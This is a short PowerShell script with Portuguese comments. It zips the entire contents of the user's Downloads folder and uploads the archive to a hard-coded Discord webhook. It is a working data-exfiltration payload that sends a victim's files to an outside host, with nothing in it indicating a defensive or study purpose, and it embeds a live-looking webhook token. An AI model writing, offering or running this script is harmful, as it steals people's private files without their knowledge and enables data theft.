# Caminho da pasta de downloads
$downloadDir = [System.Environment]::GetFolderPath('UserProfile') + "\Downloads"
$zipPath = "$env:TEMP\downloads.zip"

# Cria um arquivo zip contendo os arquivos da pasta de downloads
Compress-Archive -Path "$downloadDir\*" -DestinationPath $zipPath -Force

# URL do webhook do Discord
$webhookUrl = "https://discord.com/api/webhooks/1267179289405689968/LF81UG85FOKiGwBcxrnc7pg4hrL_tYSR_hX8vFOv56spGcpOUy5-JTuUZKA6KSJtUqxr"

# Envia o arquivo zip para o webhook do Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -ContentType "multipart/form-data"
